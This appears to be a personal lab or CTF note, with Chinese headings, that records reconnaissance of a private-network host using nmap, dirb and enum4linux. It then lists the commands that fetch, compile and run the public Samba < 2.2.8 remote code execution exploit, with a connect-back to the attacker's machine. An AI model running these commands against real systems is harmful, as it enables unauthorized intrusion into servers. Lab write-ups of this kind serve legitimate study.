---
date: 2022-07-30-星期六 15:56:04
update: 
tags: [time/year2022,time/month07]
id: 20220730155604
---
# 信息收集
nmap -n -sp 192.168.101.0/24
nmap -p- 192.168.101.46
![](Pasted%20image%2020220730155829.png)

# 漏洞发现
## 80：
dirb http://192.168.101.46 -X .php,.txt,.zip,.htm
test.php
## 22:
## 111:
# 139
 _enum4linux -a 172.16.92.138 > output.txt_
 _searchsploit samba 2.2_
  _cp /usr/share/exploitdb/platforms/linux/remote/10.c exploit.c_
   < 2.2.8 (Linux/BSD) - Remote Code Execution                                                                                                                 | multiple/remote/10.c
Samba < 2.2.8 (Linux/BSD) - Remote Code Execution                                                                                                                 | multiple/remote/10.c
_gcc -o samba exploit.c_
_chmod 755 samba_
 ./samba -b 0 -c 172.16.92.133 172.16.92.138



















# Quote
